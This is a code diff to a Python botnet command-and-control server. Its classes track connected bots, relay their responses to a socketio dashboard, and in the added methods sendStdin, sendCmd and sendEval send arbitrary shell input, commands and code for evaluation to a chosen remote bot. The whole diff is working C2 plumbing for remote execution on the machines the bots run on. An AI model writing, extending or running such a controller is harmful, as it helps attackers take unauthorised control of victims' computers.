@@ -32,15 +32,13 @@ class BotNet(Thread):
         with self.connlock:
             if user in self.allConnections:
                 # terminate and remove
-                del self.allConnections[user] #TODO: could cause sync issues
+                try:
+                    self.allConnections[user].close()
+                except:
+                    pass
+                del self.allConnections[user]
                 self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                 print("[-] Lost connection to {}".format(user))
-
-    def getConnection(self, user):
-        with self.connlock:
-            if user in self.allConnections:
-                return self.allConnections[user]
-            return None
 
     def getConnections(self):
         with self.connlock:
@@ -61,14 +59,33 @@ class BotNet(Thread):
                 user = bot.user
                 try:
                     msg = bot.recv()
-                    # TODO: emit/broadcast this message to anyone on the <user> channel/room
                     jsonobj = json.loads(msg.decode('UTF-8'))
                     jsonobj['user'] = user
                     self.socketio.emit('response', jsonobj, namespace="/bot")
                 except IOError:
                     # Connection was interrupted
-                    # TODO: inform users
                     self.removeConnection(user)
+
+    def sendStdin(self, user, cmd):
+        with self.connlock:
+            if user in self.allConnections:
+                self.allConnections[user].send(cmd, type="stdin")
+                return True
+            return False
+
+    def sendCmd(self, user, cmd):
+        with self.connlock:
+            if user in self.allConnections:
+                self.allConnections[user].send(cmd, type="cmd")
+                return True
+            return False
+
+    def sendEval(self, user, cmd):
+        with self.connlock:
+            if user in self.allConnections:
+                self.allConnections[user].send(cmd, type="eval")
+                return True
+            return False
 
 
 class BotServer(Thread):
@@ -92,10 +109,6 @@ class BotServer(Thread):
 
             self.socketio.emit('connection', {'user': user}, namespace='/bot')
 
-            # To test continuous stream, stdout is broken into multiple packets, hangs when waiting
-            # self.botnet.getConnection(user).sendStdin('find /usr/local/lib\n')
-
-
 class Bot:
     def __init__(self, sock, host_info):
         self.sock = formatsock.FormatSocket(sock)
@@ -106,17 +119,11 @@ class Bot:
         json_str = json.dumps({type: cmd})
         self.sock.send(json_str)
 
-    def sendStdin(self, cmd):
-        self.send(cmd, type="stdin")
-
-    def sendCmd(self, cmd):
-        self.send(cmd, type="cmd")
-
-    def sendEval(self, cmd):
-        self.send(cmd, type="eval")
-
     def recv(self):
         return self.sock.recv()
+
+    def close(self):
+        self.sock.close()
 
     def fileno(self):
         '''
